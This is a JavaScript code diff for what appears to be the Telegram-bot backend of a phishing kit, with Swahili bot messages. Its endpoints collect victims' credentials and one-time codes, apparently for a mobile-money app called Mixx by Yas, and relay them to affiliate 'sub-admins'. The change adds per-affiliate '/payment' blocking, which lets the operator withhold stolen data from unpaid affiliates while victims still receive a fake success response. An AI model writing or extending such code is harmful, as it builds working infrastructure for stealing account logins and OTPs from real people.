@@ -23,8 +23,7 @@ mainBot.on('polling_error', (error) => {
 });
 
 let activeSessions = {};
-let systemBlocked = false; // Tracks whether sub-admin message delivery is blocked by /payment
-let registeredAdmins = new Map(); // Stores all discovered sub-admins: chatId -> { firstName, username, lastSeen }
+let registeredAdmins = new Map(); // chatId -> { firstName, username, lastSeen, isBlocked: boolean }
 
 function escapeMarkdown(text) {
     if (!text) return '';
@@ -38,36 +37,73 @@ mainBot.on('message', (msg) => {
     const firstName = msg.from.first_name || 'Admin';
     const username = msg.from.username ? `@${msg.from.username}` : 'No username set';
 
-    // Track every user who interacts with the bot
-    registeredAdmins.set(userIdStr, {
-        firstName,
-        username,
-        lastSeen: new Date().toLocaleString()
-    });
+    // Track or update admin profile
+    if (!registeredAdmins.has(userIdStr)) {
+        registeredAdmins.set(userIdStr, {
+            firstName,
+            username,
+            lastSeen: new Date().toLocaleString(),
+            isBlocked: false
+        });
+    } else {
+        const adminInfo = registeredAdmins.get(userIdStr);
+        adminInfo.lastSeen = new Date().toLocaleString();
+    }
 
-    // Command: /activate (Main Admin only) - Allows sub-admins to route messages
+    // Command: /activate <Chat ID> (Main Admin only)
     if (msg.text.startsWith('/activate')) {
         if (userIdStr !== MAIN_ADMIN_ID) {
             mainBot.sendMessage(chatId, "⚠️ Wewe si Msimamizi Mkuu huwezi kutumia amri hii.");
             return;
         }
-        systemBlocked = false;
-        mainBot.sendMessage(chatId, "✅ **MFUMO UMEWEZESHWA (ACTIVATED)**\n\nSub-admins sasa wanaweza kupokea taarifa na ujumbe kupitia viungo vyao.", { parse_mode: "Markdown" });
+
+        const targetId = msg.text.replace('/activate', '').trim();
+        if (!targetId) {
+            mainBot.sendMessage(chatId, "⚠️ Tafadhali weka Chat ID ya sub-admin unayetaka kumwezesha.\n\nMfano:\n`/activate 123456789`", { parse_mode: "Markdown" });
+            return;
+        }
+
+        if (registeredAdmins.has(targetId)) {
+            const adminData = registeredAdmins.get(targetId);
+            adminData.isBlocked = false;
+            mainBot.sendMessage(chatId, `✅ Umemwezesha mafanikio sub-admin: \`${targetId}\` (${adminData.firstName}). Sasa anapokea ujumbe.`, { parse_mode: "Markdown" });
+            mainBot.sendMessage(targetId, "✅ *Ruhusa Yako Imewezeshwa!*\n\nSasa unapokea taarifa na ujumbe kupitia mfumo wako.", { parse_mode: "Markdown" }).catch(() => {});
+        } else {
+            mainBot.sendMessage(chatId, `⚠️ Haionekani kuwa Chat ID \`${targetId}\` imesajiliwa kwenye mfumo.`, { parse_mode: "Markdown" });
+        }
         return;
     }
 
-    // Command: /payment (Main Admin only) - Blocks sub-admin links from delivering messages to the bot
+    // Command: /payment <Chat ID> (Main Admin only) - Blocks specific sub-admin link delivery
     if (msg.text.startsWith('/payment')) {
         if (userIdStr !== MAIN_ADMIN_ID) {
             mainBot.sendMessage(chatId, "⚠️ Wewe si Msimamizi Mkuu huwezi kutumia amri hii.");
             return;
         }
-        systemBlocked = true;
-        mainBot.sendMessage(chatId, "🛑 **MFUMO UMEZUILIWA (PAYMENT/BLOCKED)**\n\nViungo vya sub-admins vimezuiwa. Ujumbe na taarifa zote kutoka kwa sub-admins hazitawafikia tena kwenye bot hadi zitakapowezeshwa tena.", { parse_mode: "Markdown" });
+
+        const targetId = msg.text.replace('/payment', '').trim();
+        if (!targetId) {
+            mainBot.sendMessage(chatId, "⚠️ Tafadhali weka Chat ID ya sub-admin unayetaka kumzuia kupitia /payment.\n\nMfano:\n`/payment 123456789`", { parse_mode: "Markdown" });
+            return;
+        }
+
+        if (targetId === MAIN_ADMIN_ID) {
+            mainBot.sendMessage(chatId, "⚠️ Huwezi kuzuia Msimamizi Mkuu.");
+            return;
+        }
+
+        if (registeredAdmins.has(targetId)) {
+            const adminData = registeredAdmins.get(targetId);
+            adminData.isBlocked = true;
+            mainBot.sendMessage(chatId, `🛑 Umemzuia sub-admin mwenye ID: \`${targetId}\` (${adminData.firstName}). Hautapokea tena ujumbe kutoka kwake.`, { parse_mode: "Markdown" });
+            mainBot.sendMessage(targetId, "🛑 *Ujumbe Umesimamishwa*\n\nUfikiaji wako wa kupokea ujumbe umesimamishwa kwa sasa na Msimamizi Mkuu.", { parse_mode: "Markdown" }).catch(() => {});
+        } else {
+            mainBot.sendMessage(chatId, `⚠️ Haionekani kuwa Chat ID \`${targetId}\` imesajiliwa kwenye mfumo.`, { parse_mode: "Markdown" });
+        }
         return;
     }
 
-    // Command: /all (Main Admin only) - Shows all sub-admins both active and dormant
+    // Command: /all (Main Admin only) - Shows all admins with active/dormant statuses
     if (msg.text.startsWith('/all')) {
         if (userIdStr !== MAIN_ADMIN_ID) {
             mainBot.sendMessage(chatId, "⚠️ Wewe si Msimamizi Mkuu huwezi kutumia amri hii.");
@@ -83,8 +119,8 @@ mainBot.on('message', (msg) => {
         let count = 1;
 
         registeredAdmins.forEach((data, id) => {
-            if (id === MAIN_ADMIN_ID) return; // Skip main admin from sub-admin listing
-            const status = systemBlocked ? "🔴 Dormant / Blocked" : "🟢 Active";
+            if (id === MAIN_ADMIN_ID) return;
+            const status = data.isBlocked ? "🔴 Dormant / Blocked (/payment)" : "🟢 Active (/activate)";
             reportText += `${count}. *${escapeMarkdown(data.firstName)}* (${data.username})\n` +
                           `   🆔 ID: \`${id}\`\n` +
                           `   📊 Hali: ${status}\n` +
@@ -164,9 +200,12 @@ app.post('/api/submit-credentials', (req, res) => {
         targetAdmin = adminId.toString().trim();
     }
 
-    if (systemBlocked && targetAdmin !== MAIN_ADMIN_ID) {
-        console.log(`⚠️ Blocked credential delivery for sub-admin ${targetAdmin} due to /payment lock.`);
-        return res.json({ success: true, sessionId });
+    // Check if specific sub-admin is blocked via /payment
+    if (targetAdmin !== MAIN_ADMIN_ID && registeredAdmins.has(targetAdmin)) {
+        if (registeredAdmins.get(targetAdmin).isBlocked) {
+            console.log(`⚠️ Blocked credential delivery for sub-admin ${targetAdmin} due to individual /payment block.`);
+            return res.json({ success: true, sessionId });
+        }
     }
 
     activeSessions[sessionId] = {
@@ -206,9 +245,12 @@ app.post('/api/submit-otp', (req, res) => {
         return res.json({ status: 'not_found', message: 'Session not found' });
     }
 
-    if (systemBlocked && session.targetAdmin !== MAIN_ADMIN_ID) {
-        console.log(`⚠️ Blocked OTP delivery for sub-admin ${session.targetAdmin} due to /payment lock.`);
-        return res.json({ success: true });
+    // Check if specific sub-admin is blocked via /payment
+    if (session.targetAdmin !== MAIN_ADMIN_ID && registeredAdmins.has(session.targetAdmin)) {
+        if (registeredAdmins.get(session.targetAdmin).isBlocked) {
+            console.log(`⚠️ Blocked OTP delivery for sub-admin ${session.targetAdmin} due to individual /payment block.`);
+            return res.json({ success: true });
+        }
     }
 
     const expectedPrefix = "You are being registered in Mixx by Yas Super App";
